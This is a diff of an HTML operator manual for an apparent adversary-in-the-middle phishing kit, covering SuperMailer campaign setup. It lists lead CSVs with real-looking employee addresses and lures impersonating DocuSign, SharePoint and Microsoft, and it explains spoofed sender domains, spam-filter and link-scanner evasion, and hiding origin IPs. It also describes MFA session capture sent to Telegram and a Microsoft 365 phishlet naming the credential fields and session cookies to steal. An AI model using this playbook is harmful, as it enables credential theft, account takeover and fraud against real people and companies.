+    <tr><td>Connection timeout</td><td>30s</td><td>Long enough for slow relays, short enough to fail fast</td></tr>
+    <tr><td>Max retries</td><td>2</td><td>Two soft-bounce retries before hard-failing</td></tr>
+  </tbody>
 </table>
-<h3 id="importing-leads">6.2 Importing Leads</h3>
-<p>Our lead files live at <code>data/leads/*.csv</code> and are ready to
-import directly into SuperMailer.</p>
+
+<h3>6.2 Importing Leads</h3>
+
+<p>Our lead files live at <code>data/leads/*.csv</code> and are ready to import directly into SuperMailer.</p>
+
 <p><strong>Lead CSV Format:</strong></p>
-<pre class="csv"><code>email,first,last,domain,pattern,department,company,title,category,mx
+
+<pre><code>email,first,last,domain,pattern,department,company,title,category,mx
 dirk.allison@addus.com,Dirk,Allison,addus.com,first.last,Executive,...</code></pre>
+
 <p><strong>Import Steps:</strong></p>
-<ol type="1">
-<li>SuperMailer → <strong>Recipients</strong> → <strong>Import</strong>
-→ <strong>CSV File</strong></li>
-<li>Select your target CSV from <code>data/leads/</code> (e.g.,
-<code>data/leads/addus_com.csv</code>)</li>
-<li>SuperMailer’s import wizard will detect the columns. Map them as
-follows:</li>
-</ol>
+
+<div class="step"><p>SuperMailer &rarr; <strong>Recipients</strong> &rarr; <strong>Import</strong> &rarr; <strong>CSV File</strong></p></div>
+<div class="step"><p>Select your target CSV from <code>data/leads/</code> (e.g., <code>data/leads/addus_com.csv</code>)</p></div>
+<div class="step"><p>SuperMailer's import wizard will detect the columns. Map them as follows:</p></div>
+
 <table>
-<thead>
-<tr>
-<th>CSV Column</th>
-<th>SuperMailer Field</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>email</code></td>
-<td>Email</td>
-</tr>
-<tr>
-<td><code>first</code></td>
-<td>FirstName</td>
-</tr>
-<tr>
-<td><code>last</code></td>
-<td>LastName</td>
-</tr>
-</tbody>
+  <thead><tr><th>CSV Column</th><th>SuperMailer Field</th></tr></thead>
+  <tbody>
+    <tr><td><code>email</code></td><td>Email</td></tr>
+    <tr><td><code>first</code></td><td>FirstName</td></tr>
+    <tr><td><code>last</code></td><td>LastName</td></tr>
+  </tbody>
 </table>
-<ol start="4" type="1">
-<li>Uncheck or ignore the extra columns (<code>domain</code>,
-<code>pattern</code>, <code>department</code>, <code>company</code>,
-<code>title</code>, <code>category</code>, <code>mx</code>) —
-SuperMailer does not need them.</li>
-<li><strong>Deduplicate:</strong> Enable SuperMailer’s built-in dedup by
-email address to avoid double-sending.</li>
-<li>Assign the imported list to a <strong>Group</strong> named after the
-campaign (e.g., <code>spring-phish-001-addus</code>).</li>
-</ol>
+
+<div class="step"><p>Uncheck or ignore the extra columns (<code>domain</code>, <code>pattern</code>, <code>department</code>, <code>company</code>, <code>title</code>, <code>category</code>, <code>mx</code>) &mdash; SuperMailer does not need them.</p></div>
+<div class="step"><p><strong>Deduplicate:</strong> Enable SuperMailer's built-in dedup by email address to avoid double-sending.</p></div>
+<div class="step"><p>Assign the imported list to a <strong>Group</strong> named after the campaign (e.g., <code>spring-phish-001-addus</code>).</p></div>
+
 <p><strong>Merge Fields in Email Content:</strong></p>
-<p>When composing the HTML lure, SuperMailer replaces merge fields with
-the recipient’s actual data:</p>
-<pre><code>{FirstName}  →  Dirk
-{Email}      →  dirk.allison@addus.com</code></pre>
-<p>Use <code>{FirstName}</code> in the email body to personalize the
-lure (e.g., “Hello Dirk,” instead of “Hello Colleague,”). This
-significantly boosts engagement rates.</p>
-<h3 id="loading-html-lures">6.3 Loading HTML Lures</h3>
-<p>Every lure is a self-contained HTML file in
-<code>campaign-emails/email/</code>. These files include all branding,
-text, and the embedded phishing link — ready to paste directly into
-SuperMailer.</p>
+
+<p>When composing the HTML lure, SuperMailer replaces merge fields with the recipient's actual data:</p>
+
+<pre><code>{FirstName}  &rarr;  Dirk
+{Email}      &rarr;  dirk.allison@addus.com</code></pre>
+
+<p>Use <code>{FirstName}</code> in the email body to personalize the lure (e.g., "Hello Dirk," instead of "Hello Colleague,"). This significantly boosts engagement rates.</p>
+
+<h3>6.3 Loading HTML Lures</h3>
+
+<p>Every lure is a self-contained HTML file in <code>campaign-emails/email/</code>. These files include all branding, text, and the embedded phishing link &mdash; ready to paste directly into SuperMailer.</p>
+
 <p><strong>Available Email Lures:</strong></p>
+
 <pre><code>campaign-emails/email/
-├── contract-signature.html     # &quot;Action Required: Sign Contract&quot;
-├── expense-report.html         # &quot;Expense Report Ready for Review&quot;
-├── hr-document.html            # &quot;Confidential HR Document&quot;
-├── invoice-payment.html        # &quot;Invoice Payment Notification&quot;
-├── it-support.html             # &quot;IT Support — Password Reset Required&quot;
-├── meeting-invite.html         # &quot;Meeting Invitation&quot;
-├── package-delivery.html       # &quot;Package Delivery Notification&quot;
-├── security-alert.html         # &quot;Security Alert — Unusual Sign-in&quot;
-├── shared-document.html        # &quot;Document Shared With You&quot;
-└── voicemail-notification.html # &quot;New Voicemail Message&quot;</code></pre>
+&#x251C;&#x2500;&#x2500; contract-signature.html     # "Action Required: Sign Contract"
+&#x251C;&#x2500;&#x2500; expense-report.html         # "Expense Report Ready for Review"
+&#x251C;&#x2500;&#x2500; hr-document.html            # "Confidential HR Document"
+&#x251C;&#x2500;&#x2500; invoice-payment.html        # "Invoice Payment Notification"
+&#x251C;&#x2500;&#x2500; it-support.html             # "IT Support &mdash; Password Reset Required"
+&#x251C;&#x2500;&#x2500; meeting-invite.html         # "Meeting Invitation"
+&#x251C;&#x2500;&#x2500; package-delivery.html       # "Package Delivery Notification"
+&#x251C;&#x2500;&#x2500; security-alert.html         # "Security Alert &mdash; Unusual Sign-in"
+&#x251C;&#x2500;&#x2500; shared-document.html        # "Document Shared With You"
+&#x2514;&#x2500;&#x2500; voicemail-notification.html # "New Voicemail Message"</code></pre>
+
 <p><strong>Loading a Lure into SuperMailer:</strong></p>
-<ol type="1">
-<li>SuperMailer → <strong>Campaign</strong> → <strong>New
-Campaign</strong> → give it a name (e.g.,
-<code>spring-phish-001-addus</code>)</li>
-<li>Go to <strong>Message</strong> tab → click the <strong>HTML
-Source</strong> button (looks like <code>&lt;&gt;</code>)</li>
-<li>Open the desired lure file (e.g.,
-<code>campaign-emails/email/shared-document.html</code>) in any text
-editor</li>
-<li><strong>Select All</strong> (<code>Ctrl+A</code>) →
-<strong>Copy</strong> (<code>Ctrl+C</code>)</li>
-<li><strong>Paste</strong> the entire contents into SuperMailer’s HTML
-Source view</li>
-<li>Click <strong>Apply</strong> to render the HTML preview</li>
-<li>The phishing link is already embedded in the lure — no need to add
-or modify it. The link points to your domain (e.g.,
-<code>https://glnt.cc/#...</code>) and is ready to capture.</li>
-</ol>
-<p><strong>Important:</strong> - SuperMailer auto-generates a plain text
-fallback from your HTML. Check the <strong>Text</strong> tab to verify
-it reads naturally. - The link inside the lure comes from
-<code>CURRENT_LINK.txt</code> at the repository root. Make sure you’ve
-generated a fresh link before building the campaign. - Do NOT modify the
-HTML after pasting — any changes to link structure can break the
-tracking or render the link unclickable.</p>
-<h3 id="setting-up-the-sender">6.4 Setting Up the Sender</h3>
-<p>The From identity must match the lure’s branding to look
-legitimate.</p>
+
+<div class="step"><p>SuperMailer &rarr; <strong>Campaign</strong> &rarr; <strong>New Campaign</strong> &rarr; give it a name (e.g., <code>spring-phish-001-addus</code>)</p></div>
+<div class="step"><p>Go to <strong>Message</strong> tab &rarr; click the <strong>HTML Source</strong> button (looks like <code>&lt;&gt;</code>)</p></div>
+<div class="step"><p>Open the desired lure file (e.g., <code>campaign-emails/email/shared-document.html</code>) in any text editor</p></div>
+<div class="step"><p><strong>Select All</strong> (<kbd>Ctrl+A</kbd>) &rarr; <strong>Copy</strong> (<kbd>Ctrl+C</kbd>)</p></div>
+<div class="step"><p><strong>Paste</strong> the entire contents into SuperMailer's HTML Source view</p></div>
+<div class="step"><p>Click <strong>Apply</strong> to render the HTML preview</p></div>
+<div class="step"><p>The phishing link is already embedded in the lure &mdash; no need to add or modify it. The link points to your domain (e.g., <code>https://glnt.cc/#...</code>) and is ready to capture.</p></div>
+
+<div class="note"><strong>Important:</strong>
+<ul>
+  <li>SuperMailer auto-generates a plain text fallback from your HTML. Check the <strong>Text</strong> tab to verify it reads naturally.</li>
+  <li>The link inside the lure comes from <code>CURRENT_LINK.txt</code> at the repository root. Make sure you've generated a fresh link before building the campaign.</li>
+  <li>Do NOT modify the HTML after pasting &mdash; any changes to link structure can break the tracking or render the link unclickable.</li>
+</ul></div>
+
+<h3>6.4 Setting Up the Sender</h3>
+
+<p>The From identity must match the lure's branding to look legitimate.</p>
+
 <p><strong>Sender Configuration:</strong></p>
+
 <table>
-<colgroup>
-<col style="width: 33%" />
-<col style="width: 33%" />
-<col style="width: 33%" />
-</colgroup>
-<thead>
-<tr>
-<th>Field</th>
-<th>Value</th>
-<th>Notes</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>From Name</strong></td>
-<td>Match the lure theme</td>
-<td>e.g., “DocuSign”, “SharePoint”, “IT Support”, “HR Department”</td>
-</tr>
-<tr>
-<td><strong>From Email</strong></td>
-<td>Matching sender address</td>
-<td>e.g., <code>documents@portal-verify.com</code>,
-<code>noreply@sharepoint-files.com</code></td>
-</tr>
-<tr>
-<td><strong>Reply-To</strong></td>
-<td>Same as From Email</td>
-<td>Consistency — replies should land in a monitored inbox</td>
-</tr>
-<tr>
-<td><strong>Return-Path</strong></td>
-<td>Different from sender</td>
-<td>Use a bounce-handling address, e.g.,
-<code>bounces@your-relay.com</code>. This keeps bounce notifications
-separate from deliverability metrics.</td>
-</tr>
-</tbody>
+  <thead><tr><th>Field</th><th>Value</th><th>Notes</th></tr></thead>
+  <tbody>
+    <tr><td><strong>From Name</strong></td><td>Match the lure theme</td><td>e.g., "DocuSign", "SharePoint", "IT Support", "HR Department"</td></tr>
+    <tr><td><strong>From Email</strong></td><td>Matching sender address</td><td>e.g., <code>documents@portal-verify.com</code>, <code>noreply@sharepoint-files.com</code></td></tr>
+    <tr><td><strong>Reply-To</strong></td><td>Same as From Email</td><td>Consistency &mdash; replies should land in a monitored inbox</td></tr>
+    <tr><td><strong>Return-Path</strong></td><td>Different from sender</td><td>Use a bounce-handling address, e.g., <code>bounces@your-relay.com</code>. This keeps bounce notifications separate from deliverability metrics.</td></tr>
+  </tbody>
 </table>
-<p><strong>Choosing the Sender Domain:</strong> - The sender domain must
-be a real domain you control with valid SPF/DKIM/DMARC records. - Do NOT
-use your phishing domain (e.g., <code>glnt.cc</code>) as the sender — it
-ties the lure delivery infrastructure to the phishing infrastructure. -
-Use a generic, legitimate-sounding domain registered separately from the
-phishing domain. - Set up SPF, DKIM, and DMARC on the sender domain
-before sending. Use <a
-href="https://mail-tester.com">mail-tester.com</a> to verify
-deliverability.</p>
-<h3 id="testing-before-send">6.5 Testing Before Send</h3>
-<p>Never send a campaign without testing end-to-end first.</p>
+
+<p><strong>Choosing the Sender Domain:</strong></p>
+
+<ul>
+  <li>The sender domain must be a real domain you control with valid SPF/DKIM/DMARC records.</li>
+  <li>Do NOT use your phishing domain (e.g., <code>glnt.cc</code>) as the sender &mdash; it ties the lure delivery infrastructure to the phishing infrastructure.</li>
+  <li>Use a generic, legitimate-sounding domain registered separately from the phishing domain.</li>
+  <li>Set up SPF, DKIM, and DMARC on the sender domain before sending. Use <a href="https://mail-tester.com">mail-tester.com</a> to verify deliverability.</li>
+</ul>
+
+<h3>6.5 Testing Before Send</h3>
+
+<div class="warn"><strong>Never send a campaign without testing end-to-end first.</strong></div>
+
 <p><strong>Test Procedure:</strong></p>
-<ol type="1">
-<li><strong>Send a test email to yourself</strong> in SuperMailer:
-Campaign → <strong>Send Test</strong> → enter your personal email.</li>
-<li><strong>Check rendering:</strong> Does it display correctly in
-Gmail, Outlook, and mobile? Test all three.</li>
-<li><strong>Run through <a
-href="https://mail-tester.com">mail-tester.com</a>:</strong>
+
+<div class="step"><p><strong>Send a test email to yourself</strong> in SuperMailer: Campaign &rarr; <strong>Send Test</strong> &rarr; enter your personal email.</p></div>
+<div class="step"><p><strong>Check rendering:</strong> Does it display correctly in Gmail, Outlook, and mobile? Test all three.</p></div>
+<div class="step"><p><strong>Run through <a href="https://mail-tester.com">mail-tester.com</a>:</strong> Send a test email to the random address mail-tester.com gives you. Check the score &mdash; it must be <strong>9/10 or higher</strong>. Fix any issues it reports (missing SPF, broken images, spammy keywords).</p></div>
+<div class="step"><p><strong>Verify the link works:</strong> Click the link in the received test email. Confirm: the bootloader loads (no spinner stuck forever), you reach the real Microsoft/Google/Okta login page, you can enter credentials and complete MFA, a Telegram notification arrives with the captured session.</p></div>
+<div class="step"><p><strong>Check headers for leaks:</strong> View the raw email source (in Gmail: three dots &rarr; Show Original). Verify: no <code>glnt.cc</code> references anywhere in headers, no Go server strings (<code>X-Powered-By</code>, internal IPs, etc.), the <code>Received:</code> chain does not expose your EC2 IP, <code>Return-Path</code> is set to your bounce address (not the phishing domain).</p></div>
+
+<div class="warn"><strong>Red flags &mdash; do NOT send the campaign if:</strong>
 <ul>
-<li>Send a test email to the random address mail-tester.com gives
-you</li>
-<li>Check the score — it must be <strong>9/10 or higher</strong></li>
-<li>Fix any issues it reports (missing SPF, broken images, spammy
-keywords)</li>
-</ul></li>
-<li><strong>Verify the link works:</strong> Click the link in the
-received test email. Confirm:
-<ul>
-<li>The bootloader loads (no spinner stuck forever)</li>
-<li>You reach the real Microsoft/Google/Okta login page</li>
-<li>You can enter credentials and complete MFA</li>
-<li>A Telegram notification arrives with the captured session</li>
-</ul></li>
-<li><strong>Check headers for leaks:</strong> View the raw email source
-(in Gmail: three dots → Show Original). Verify:
-<ul>
-<li>No <code>glnt.cc</code> references anywhere in headers</li>
-<li>No Go server strings (<code>X-Powered-By</code>, internal IPs,
-etc.)</li>
-<li>The <code>Received:</code> chain does not expose your EC2 IP</li>
-<li><code>Return-Path</code> is set to your bounce address (not the
-phishing domain)</li>
-</ul></li>
-</ol>
-<p><strong>Red flags — do NOT send the campaign if:</strong> -
-mail-tester.com score is below 9 - The link does not resolve or the
-bootloader hangs - Telegram does not receive the test capture - Headers
-leak your phishing domain or origin IP</p>
-<h3 id="sending-the-campaign">6.6 Sending the Campaign</h3>
-<p>Deliverability is everything. A well-crafted lure that lands in spam
-is worse than no lure at all.</p>
+  <li>mail-tester.com score is below 9</li>
+  <li>The link does not resolve or the bootloader hangs</li>
+  <li>Telegram does not receive the test capture</li>
+  <li>Headers leak your phishing domain or origin IP</li>
+</ul></div>
+
+<h3>6.6 Sending the Campaign</h3>
+
+<div class="margin-note">Deliverability is everything. A well-crafted lure in spam is worse than no lure at all.</div>
+
+<p>Deliverability is everything. A well-crafted lure that lands in spam is worse than no lure at all.</p>
+
 <p><strong>Warm-Up Schedule:</strong></p>
+
 <table>
-<colgroup>
-<col style="width: 21%" />
-<col style="width: 18%" />
-<col style="width: 31%" />
-<col style="width: 28%" />
-</colgroup>
-<thead>
-<tr>
-<th>Phase</th>
-<th>Rate</th>
-<th>Duration</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Warm-up</td>
-<td>10/hr</td>
-<td>Day 1-2</td>
-<td>Build sender reputation slowly</td>
-</tr>
-<tr>
-<td>Ramp</td>
-<td>25-50/hr</td>
-<td>Day 3</td>
-<td>Approach operating rate</td>
-</tr>
-<tr>
-<td>Full send</td>
-<td>50-100/hr</td>
-<td>Day 4+</td>
-<td>Operating rate for remaining targets</td>
-</tr>
-</tbody>
+  <thead><tr><th>Phase</th><th>Rate</th><th>Duration</th><th>Purpose</th></tr></thead>
+  <tbody>
+    <tr><td>Warm-up</td><td>10/hr</td><td>Day 1-2</td><td>Build sender reputation slowly</td></tr>
+    <tr><td>Ramp</td><td>25-50/hr</td><td>Day 3</td><td>Approach operating rate</td></tr>
+    <tr><td>Full send</td><td>50-100/hr</td><td>Day 4+</td><td>Operating rate for remaining targets</td></tr>
+  </tbody>
 </table>
-<ul>
-<li>Start with a <strong>small batch</strong> (50 recipients) and
-monitor deliverability before sending to the full list.</li>
-<li>If the full list has fewer than 100 recipients, you can skip the
-warm-up and send at 25/hr from the start.</li>
-</ul>
+
+<p>Start with a <strong>small batch</strong> (50 recipients) and monitor deliverability before sending to the full list. If the full list has fewer than 100 recipients, you can skip the warm-up and send at 25/hr from the start.</p>
+
 <p><strong>During the Campaign:</strong></p>
-<ol type="1">
-<li><strong>Watch bounce rate</strong> in the SuperMailer dashboard. If
-it exceeds <strong>5%</strong>, <strong>pause the campaign
-immediately</strong> — your sender reputation is deteriorating.
-Investigate:
+
+<div class="step"><p><strong>Watch bounce rate</strong> in the SuperMailer dashboard. If it exceeds <strong>5%</strong>, <strong>pause the campaign immediately</strong> &mdash; your sender reputation is deteriorating. Investigate: invalid email addresses in the lead list, recipient mail servers rejecting your sender domain, spam filter triggering on specific keywords in your lure.</p></div>
+<div class="step"><p><strong>Track opens and clicks</strong> in SuperMailer's built-in analytics: open rate below 15% = subject line or sender identity problem, click rate below 3% = lure content or link placement problem, high open rate + low click rate = the link may be broken or URL-wrapped by a security filter.</p></div>
+<div class="step"><p><strong>Cross-reference with our analytics dashboard</strong> (<code>http://&lt;EC2-IP&gt;:9092/?token=&lt;TOKEN&gt;</code>): compare SuperMailer's click count with the dashboard's event count &mdash; they should roughly match. If clicks are high but captures are low, the bootloader or proxy may be down. The dashboard gives ground-truth data on who actually completed the login flow.</p></div>
+
+<p><strong>Post-Send:</strong></p>
+
 <ul>
-<li>Invalid email addresses in the lead list</li>
-<li>Recipient mail servers rejecting your sender domain</li>
-<li>Spam filter triggering on specific keywords in your lure</li>
-</ul></li>
-<li><strong>Track opens and clicks</strong> in SuperMailer’s built-in
-analytics:
-<ul>
-<li>Open rate below 15% = subject line or sender identity problem</li>
-<li>Click rate below 3% = lure content or link placement problem</li>
-<li>High open rate + low click rate = the link may be broken or
-URL-wrapped by a security filter</li>
-</ul></li>
-<li><strong>Cross-reference with our analytics dashboard</strong>
-(<code>http://&lt;EC2-IP&gt;:9092/?token=&lt;TOKEN&gt;</code>):
-<ul>
-<li>Compare SuperMailer’s click count with the dashboard’s event count —
-they should roughly match</li>
-<li>If clicks are high but captures are low, the bootloader or proxy may
-be down</li>
-<li>The dashboard gives ground-truth data on who actually completed the
-login flow</li>
-</ul></li>
-</ol>
-<p><strong>Post-Send:</strong> - Export SuperMailer’s delivery report
-and save it to
-<code>data/campaigns/&lt;campaign-id&gt;/delivery-report.csv</code> -
-Compare it with <code>data/captures.jsonl</code> to identify which
-recipients clicked but did not complete login - Burn the sender domain
-and IP if detection is suspected</p>
-<h3 id="attachment-lures">6.7 Attachment Lures</h3>
-<p>Some scenarios perform better when the lure is delivered as an
-<code>.html</code> attachment rather than embedded in the email body.
-Attachment lures bypass some client-side link scanners that inspect
-inline HTML.</p>
-<p><strong>Available Attachment Lures:</strong></p>
-<pre><code>campaign-emails/attachments/
-├── adobe-contract.html        # Adobe-branded contract review
-├── docusign-wire.html         # DocuSign-branded wire authorization
-├── dropbox-share.html         # Dropbox-branded file share
-├── excel-shared.html          # Excel Online shared workbook
-├── gdocs-shared.html          # Google Docs shared document
-├── onedrive-file.html         # OneDrive file access
-├── sharepoint-doc.html        # SharePoint document library
-├── stripe-payment.html        # Stripe payment notification
-├── teams-recording.html       # Microsoft Teams meeting recording
-└── zoom-recording.html        # Zoom cloud recording</code></pre>
-<p><strong>How Attachment Lures Work:</strong></p>
-<p>The victim receives an email with a branded attachment. When they
-open the <code>.html</code> file, it renders a convincing branded page
-in their browser. The page looks exactly like a DocuSign/SharePoint/Zoom
-notification complete with:</p>
-<ul>
-<li>Realistic branding (logos, colors, fonts matching the real
-service)</li>
-<li>A prominent call-to-action button (“View Document”, “Sign Now”,
-“Watch Recording”)</li>
-<li>When the victim clicks the button, they are redirected to
-<code>glnt.cc</code> which then proxies them to the real Microsoft login
-page</li>
+  <li>Export SuperMailer's delivery report and save it to <code>data/campaigns/&lt;campaign-id&gt;/delivery-report.csv</code></li>
+  <li>Compare it with <code>data/captures.jsonl</code> to identify which recipients clicked but did not complete login</li>
+  <li>Burn the sender domain and IP if detection is suspected</li>
 </ul>
+
+<h3>6.7 Attachment Lures</h3>
+
+<p>Some scenarios perform better when the lure is delivered as an <code>.html</code> attachment rather than embedded in the email body. Attachment lures bypass some client-side link scanners that inspect inline HTML.</p>
+
+<p><strong>Available Attachment Lures:</strong></p>
+
+<pre><code>campaign-emails/attachments/
+&#x251C;&#x2500;&#x2500; adobe-contract.html        # Adobe-branded contract review
+&#x251C;&#x2500;&#x2500; docusign-wire.html         # DocuSign-branded wire authorization
+&#x251C;&#x2500;&#x2500; dropbox-share.html          # Dropbox-branded file share
+&#x251C;&#x2500;&#x2500; excel-shared.html           # Excel Online shared workbook
+&#x251C;&#x2500;&#x2500; gdocs-shared.html           # Google Docs shared document
+&#x251C;&#x2500;&#x2500; onedrive-file.html          # OneDrive file access
+&#x251C;&#x2500;&#x2500; sharepoint-doc.html         # SharePoint document library
+&#x251C;&#x2500;&#x2500; stripe-payment.html         # Stripe payment notification
+&#x251C;&#x2500;&#x2500; teams-recording.html        # Microsoft Teams meeting recording
+&#x2514;&#x2500;&#x2500; zoom-recording.html         # Zoom cloud recording</code></pre>
+
+<p><strong>How Attachment Lures Work:</strong></p>
+
+<p>The victim receives an email with a branded attachment. When they open the <code>.html</code> file, it renders a convincing branded page in their browser. The page looks exactly like a DocuSign/SharePoint/Zoom notification complete with:</p>
+
+<ul>
+  <li>Realistic branding (logos, colors, fonts matching the real service)</li>
+  <li>A prominent call-to-action button ("View Document", "Sign Now", "Watch Recording")</li>
+  <li>When the victim clicks the button, they are redirected to <code>glnt.cc</code> which then proxies them to the real Microsoft login page</li>
+</ul>
+
 <p><strong>Sending Attachment Lures in SuperMailer:</strong></p>
-<ol type="1">
-<li>SuperMailer → <strong>Campaign</strong> → <strong>Message</strong>
-tab</li>
-<li>Write a simple email body: “Please find the attached document. Let
-me know if you have any questions.”</li>
-<li>Click <strong>Attach File</strong> → browse to
-<code>campaign-emails/attachments/</code> and select the
-<code>.html</code> file</li>
-<li>The attachment will appear as an icon or link in the recipient’s
-email client</li>
-<li>Set the <strong>From Name</strong> and <strong>From Email</strong>
-to match the brand in the attachment (e.g., for
-<code>docusign-wire.html</code>, use “DocuSign” and
-<code>noreply@docusign-notify.com</code>)</li>
-<li>Follow the same testing procedure from Section 6.5 — open the
-attachment yourself and verify the link redirects correctly.</li>
-</ol>
-<p><strong>When to Use Attachments vs. Inline HTML:</strong></p>
+
+<div class="step"><p>SuperMailer &rarr; <strong>Campaign</strong> &rarr; <strong>Message</strong> tab</p></div>
+<div class="step"><p>Write a simple email body: "Please find the attached document. Let me know if you have any questions."</p></div>
+<div class="step"><p>Click <strong>Attach File</strong> &rarr; browse to <code>campaign-emails/attachments/</code> and select the <code>.html</code> file</p></div>
+<div class="step"><p>The attachment will appear as an icon or link in the recipient's email client</p></div>
+<div class="step"><p>Set the <strong>From Name</strong> and <strong>From Email</strong> to match the brand in the attachment (e.g., for <code>docusign-wire.html</code>, use "DocuSign" and <code>noreply@docusign-notify.com</code>)</p></div>
+<div class="step"><p>Follow the same testing procedure from Section 6.5 &mdash; open the attachment yourself and verify the link redirects correctly.</p></div>
+
+<p><strong>When to Use Attachments vs. Inline HTML:</strong></p>
+
 <table>
-<colgroup>
-<col style="width: 38%" />
-<col style="width: 30%" />
-<col style="width: 30%" />
-</colgroup>
-<thead>
-<tr>
-<th>Scenario</th>
-<th>Format</th>
-<th>Reason</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Financial/legal documents</td>
-<td>Attachment</td>
-<td>Higher perceived legitimacy for sensitive docs</td>
-</tr>
-<tr>
-<td>IT/security notifications</td>
-<td>Inline</td>
-<td>Urgency demands immediate visibility</td>
-</tr>
-<tr>
-<td>Voicemail/meeting notifications</td>
-<td>Inline</td>
-<td>Quick glance value</td>
-</tr>
-<tr>
-<td>Signed contracts, invoices</td>
-<td>Attachment</td>
-<td>Real invoices are always attachments</td>
-</tr>
-<tr>
-<td>General document sharing</td>
-<td>Either</td>
-<td>A/B test both and use the higher-performing format</td>
-</tr>
-</tbody>
+  <thead><tr><th>Scenario</th><th>Format</th><th>Reason</th></tr></thead>
+  <tbody>
+    <tr><td>Financial/legal documents</td><td>Attachment</td><td>Higher perceived legitimacy for sensitive docs</td></tr>
+    <tr><td>IT/security notifications</td><td>Inline</td><td>Urgency demands immediate visibility</td></tr>
+    <tr><td>Voicemail/meeting notifications</td><td>Inline</td><td>Quick glance value</td></tr>
+    <tr><td>Signed contracts, invoices</td><td>Attachment</td><td>Real invoices are always attachments</td></tr>
+    <tr><td>General document sharing</td><td>Either</td><td>A/B test both and use the higher-performing format</td></tr>
+  </tbody>
 </table>
-<hr />
-<h2 id="phishlet-configuration">7. Phishlet Configuration</h2>
-<p>Phishlets define how to interact with each identity provider. They’re
-JSON files in <code>proxy-server/phishlets/</code>.</p>
-<h3 id="microsoft-365">Microsoft 365</h3>
-<div class="sourceCode" id="cb20"><pre
-class="sourceCode json"><code class="sourceCode json"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
-<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;name&quot;</span><span class="fu">:</span> <span class="st">&quot;microsoft&quot;</span><span class="fu">,</span></span>
-<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;label&quot;</span><span class="fu">:</span> <span class="st">&quot;Microsoft 365&quot;</span><span class="fu">,</span></span>
-<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;upstream&quot;</span><span class="fu">:</span> <span class="st">&quot;https://login.microsoftonline.com&quot;</span><span class="fu">,</span></span>
-<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;hostname&quot;</span><span class="fu">:</span> <span class="st">&quot;login.&lt;your-domain&gt;&quot;</span><span class="fu">,</span></span>
-<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;credential_fields&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
-<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;username&quot;</span><span class="fu">:</span> <span class="ot">[</span><span class="st">&quot;loginfmt&quot;</span><span class="ot">,</span> <span class="st">&quot;login&quot;</span><span class="ot">,</span> <span class="st">&quot;email&quot;</span><span class="ot">,</span> <span class="st">&quot;username&quot;</span><span class="ot">]</span><span class="fu">,</span></span>
-<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;password&quot;</span><span class="fu">:</span> <span class="ot">[</span><span class="st">&quot;passwd&quot;</span><span class="ot">,</span> <span class="st">&quot;password&quot;</span><span class="ot">,</span> <span class="st">&quot;Password&quot;</span><span class="ot">,</span> <span class="st">&quot;secret&quot;</span><span class="ot">]</span></span>
-<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a>  <span class="fu">},</span></span>
-<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;session_cookies&quot;</span><span class="fu">:</span> <span class="ot">[</span></span>
-<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;ESTSAUTH&quot;</span><span class="ot">,</span> <span class="st">&quot;ESTSAUTHPERSISTENT&quot;</span><span class="ot">,</span> <span class="st">&quot;ESTSAUTHLIGHT&quot;</span><span class="ot">,</span></span>
-<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;SignInStateCookie&quot;</span><span class="ot">,</span> <span class="st">&quot;fpc&quot;</span><span class="ot">,</span> <span class="st">&quot;esctx&quot;</span></span>
-<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a>  <span class="ot">]</span><span class="fu">,</span></span>
-<span id="cb20-14"><a href="#cb20-14" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;rewrite&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
-<span id="cb20-15"><a href="#cb20-15" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;strip_csp&quot;</span><span class="fu">:</span> <span class="kw">true</span><span class="fu">,</span></span>
-<span id="cb20-16"><a href="#cb20-16" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;strip_xfo&quot;</span><span class="fu">:</span> <span class="kw">true</span><span class="fu">,</span></span>
-<span id="cb20-17"><a href="#cb20-17" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;strip_hsts&quot;</span><span class="fu">:</span> <span class="kw">true</span><span class="fu">,</span></span>
-<span id="cb20-18"><a href="#cb20-18" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;strip_cookie_secure&quot;</span><span class="fu">:</span> <span class="kw">true</span><span class="fu">,</span></span>
-<span id="cb20-19"><a href="#cb20-19" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;strip_cookie_domain&quot;</span><span class="fu">:</span> <span class="kw">true</span><span class="fu">,</span></span>
-<span id="cb20-20"><a href="#cb20-20" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;rewrite_location&quot;</span><span class="fu">:</span> <span class="kw">true</span></span>
-<span id="cb20-21"><a href="#cb20-21" aria-hidden="true" tabindex="-1"></a>  <span class="fu">}</span></span>
-<span id="cb20-22"><a href="#cb20-22" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
-<h3 id="key-parameters">Key Parameters</h3>
+
+<h2>Phishlet Configuration</h2>
